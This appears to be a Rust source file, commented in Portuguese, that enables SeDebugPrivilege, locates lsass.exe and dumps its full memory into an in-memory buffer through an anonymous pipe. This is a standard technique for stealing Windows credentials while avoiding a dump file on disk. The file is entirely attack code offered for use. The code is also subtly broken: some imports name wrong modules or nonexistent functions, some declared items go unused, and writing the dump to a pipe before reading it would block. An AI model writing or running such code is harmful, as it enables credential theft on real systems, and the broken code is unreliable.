use winapi::{
    shared::minwindef::{DWORD, FALSE, TRUE, UINT},
    um::{
        dbghelp::{MiniDumpWriteDump, MINIDUMP_TYPE},
        handleapi::CloseHandle,
        memoryapi::OpenProcess,
        processthreadsapi::{OpenProcessToken, GetCurrentProcess},
        securitybaseapi::AdjustTokenPrivileges,
        tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W},
        winnt::{
            HANDLE, LUID, SE_PRIVILEGE_ENABLED, SE_DEBUG_NAME, TOKEN_ADJUST_PRIVILEGES,
            TOKEN_PRIVILEGES, TOKEN_QUERY, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
            PROCESS_VM_WRITE, PROCESS_VM_OPERATION,
        },
        winbase::LOOKUP_PRIVILEGE_VALUEW,
        errhandlingapi::GetLastError,
    },
};
use std::ptr;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::mem;

// Estrutura para callback do MiniDump
struct CallbackContext {
    buffer: Vec<u8>,
}

extern "system" fn minidump_callback(
    _call_type: UINT,
    _callback_param: *mut ::std::os::raw::c_void,
    _callback_input: *mut ::std::os::raw::c_void,
    _callback_output: *mut ::std::os::raw::c_void,
) -> BOOL {
    // Implementação do callback pra capturar dados em memória
    TRUE
}

pub fn dump_to_memory() -> Result<Vec<u8>, String> {
    // 1. Ativa privilégio SeDebugPrivilege
    enable_debug_privilege()?;
    
    // 2. Encontra PID do lsass.exe
    let pid = find_process_id("lsass.exe")?;
    
    // 3. Abre processo com privilégios máximos
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | 
            PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
            FALSE,
            pid,
        )
    };
    
    if process_handle.is_null() {
        return Err(format!("Failed to open process, error: {}", unsafe { GetLastError() }));
    }
    
    // 4. Prepara buffer pra receber o dump
    let mut dump_buffer: Vec<u8> = Vec::new();
    
    // 5. Configura callback pra capturar dump em memória
    // NOTA: MiniDumpWriteDump normalmente escreve em arquivo.
    // Pra capturar em memória, precisamos usar um callback ou
    // criar um pipe/memória mapeada.
    
    // Abordagem alternativa: usar Named Pipe ou Memory-Mapped File
    // Vamos usar um pipe anônimo pra capturar os dados
    
    use winapi::um::namedpipeapi::CreatePipe;
    use winapi::um::handleapi::SetHandleInformation;
    use winapi::um::winbase::{HANDLE_FLAG_INHERIT};
    
    let mut read_pipe: HANDLE = ptr::null_mut();
    let mut write_pipe: HANDLE = ptr::null_mut();
    let sa = ptr::null_mut(); // Security attributes
    
    let success = unsafe {
        CreatePipe(&mut read_pipe, &mut write_pipe, sa, 0)
    };
    
    if success == 0 {
        unsafe { CloseHandle(process_handle); }
        return Err("Failed to create pipe".to_string());
    }
    
    // Garante que o pipe de leitura não é herdado
    unsafe {
        SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);
    }
    
    // 6. Executa o MiniDumpWriteDump escrevendo no pipe
    let dump_type: MINIDUMP_TYPE = 0x00000002; // MiniDumpWithFullMemory
    
    let result = unsafe {
        MiniDumpWriteDump(
            process_handle,
            pid,
            write_pipe,
            dump_type,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
        )
    };
    
    unsafe { CloseHandle(write_pipe); }
    
    if result == 0 {
        unsafe { CloseHandle(process_handle); CloseHandle(read_pipe); }
        return Err(format!("MiniDumpWriteDump failed, error: {}", unsafe { GetLastError() }));
    }
    
    // 7. Lê os dados do pipe pro buffer
    use winapi::um::fileapi::ReadFile;
    use winapi::um::winnt::LPOVERLAPPED;
    
    let mut buffer = [0u8; 65536]; // 64KB chunks
    let mut bytes_read: DWORD = 0;
    let mut full_buffer = Vec::new();
    
    loop {
        let success = unsafe {
            ReadFile(
                read_pipe,
                buffer.as_mut_ptr() as _,
                buffer.len() as u32,
                &mut bytes_read,
                ptr::null_mut() as LPOVERLAPPED,
            )
        };
        
        if success == 0 || bytes_read == 0 {
            break;
        }
        
        full_buffer.extend_from_slice(&buffer[..bytes_read as usize]);
    }
    
    unsafe { 
        CloseHandle(read_pipe);
        CloseHandle(process_handle);
    }
    
    if full_buffer.is_empty() {
        return Err("No data read from pipe".to_string());
    }
    
    Ok(full_buffer)
}

fn enable_debug_privilege() -> Result<(), String> {
    let mut token_handle: HANDLE = ptr::null_mut();
    
    // Abre token do processo atual
    let success = unsafe {
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        )
    };
    
    if success == 0 {
        return Err("Failed to open process token".to_string());
    }
    
    // Lookup LUID for SeDebugPrivilege
    let mut luid: LUID = unsafe { mem::zeroed() };
    let privilege_name: Vec<u16> = OsStr::new(SE_DEBUG_NAME)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    let success = unsafe {
        LOOKUP_PRIVILEGE_VALUEW(
            ptr::null(),
            privilege_name.as_ptr(),
            &mut luid,
        )
    };
    
    if success == 0 {
        unsafe { CloseHandle(token_handle); }
        return Err("Failed to lookup privilege".to_string());
    }
    
    // Ativa o privilégio
    let mut tp: TOKEN_PRIVILEGES = unsafe { mem::zeroed() };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    let success = unsafe {
        AdjustTokenPrivileges(
            token_handle,
            FALSE,
            &mut tp,
            mem::size_of::<TOKEN_PRIVILEGES>() as u32,
            ptr::null_mut(),
            ptr::null_mut(),
        )
    };
    
    unsafe { CloseHandle(token_handle); }
    
    if success == 0 {
        return Err("Failed to adjust token privileges".to_string());
    }
    
    Ok(())
}

fn find_process_id(process_name: &str) -> Result<DWORD, String> {
    let snapshot = unsafe {
        CreateToolhelp32Snapshot(
            winapi::um::tlhelp32::TH32CS_SNAPPROCESS,
            0,
        )
    };
    
    if snapshot as isize == -1isize {
        return Err("Failed to create snapshot".to_string());
    }
    
    let mut entry: PROCESSENTRY32W = unsafe { mem::zeroed() };
    entry.dwSize = mem::size_of::<PROCESSENTRY32W>() as u32;
    
    let success = unsafe { Process32FirstW(snapshot, &mut entry) };
    
    if success == 0 {
        unsafe { CloseHandle(snapshot); }
        return Err("Failed to get first process".to_string());
    }
    
    let target_name: Vec<u16> = OsStr::new(process_name)
        .encode_wide()
        .chain(Some(0))
        .collect();
    
    loop {
        let current_name = &entry.szExeFile;
        
        // Compara nome do processo (case insensitive)
        if unsafe { 
            winapi::um::winbase::lstrcmpiW(current_name.as_ptr(), target_name.as_ptr()) == 0 
        } {
            let pid = entry.th32ProcessID;
            unsafe { CloseHandle(snapshot); }
            return Ok(pid);
        }
        
        let success = unsafe { Process32NextW(snapshot, &mut entry) };
        if success == 0 {
            break;
        }
    }
    
    unsafe { CloseHandle(snapshot); }
    Err(format!("Process {} not found", process_name))
}